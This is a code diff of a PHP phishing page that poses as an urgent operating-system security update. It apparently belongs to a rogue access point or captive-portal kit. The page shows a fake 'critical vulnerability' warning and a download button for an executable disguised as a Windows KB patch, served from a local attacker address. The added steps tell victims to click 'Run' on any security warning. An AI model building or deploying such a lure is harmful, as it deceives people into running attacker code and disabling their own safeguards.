@@ -25,18 +25,12 @@ else $file="http://10.0.0.1/Windows-KB183905-x86-ENU.exe";
 <title>Update</title>
 <style type="text/css">
 <!--
- h1, p, a, body{
+ p, a, body{
 	font-family: Arial, Hevetica, sans-serif;
-	font-weight: bold;
 	font-size: 24px;
 	color: #000000;
+        text-align: center;
 }
-
-.box, .box_body, .box_head, .box_head h2{ background: transparent url(bkgd.png) no-repeat bottom right}
-.box{  width:1100px !important; width: 1000px; padding-right:15px; margin:20px auto}
-.box_head{background-position:top right; margin-right:-15px; padding-right:40px}
-.box_head h2{ background-position:top left; margin:0; border:0; padding:25px 0 15px 40px; height:auto !important; height:1%}
-.box_body{ background-position:bottom left; margin-right:25px; padding:15px 0 15px 40px}
 
 .buttons a, .buttons button{
 
@@ -104,11 +98,20 @@ button.positive, .buttons a.positive{
 </style>
 </head>
 <body>
- <p align="center"><img src="<?php echo $OS;?>.jpg" width="100" height="100" alt="logo logo"><br/><br/>
-<div class="box">
- <div class="box_head"><h2>There has been a <u>critical vulnerability</u> discovered in <?php echo $OS;?></h2></div>
- <div class="box_body"><p align="center">It is essential that you patch your system before continuing.<br /><br />Sorry for any inconvenience caused.</p></div>
-</div>
+ <br
+ <img src="<?php echo $OS;?>.jpg" width="100" height="100" alt="logo"><br /><br />
+ <h2>There has been a <u>critical vulnerability</u> discovered in <?php echo $OS;?></h2>
+ <b>It is essential that you patch your system before continuing.<br /><br />
+ Sorry for any inconvenience caused.</b>
 <div class="buttons"><p align="center"><a class="positive" name="save" href="#" onclick="window.open('<?php echo $file;?>','download'); return false;"><img src="tick.png" alt=""/>Download Update</a></p></div>
+<br />
+<h3>How to update: </h3>
+1.) Click on the link above to begin the download process.<br />
+2.) You will be asked if you want to save the file. Click the "run" button.<br />
+3.) Wait for the download to complete. <br />
+4.) Click "Run" to any security warning. <br />
+5.) After the update is apply, you will be able to surf the internet<br />
+<br />
+<i> Please note: The update may take up to 2 minutes to complete. </i>
 </body>
 </html>
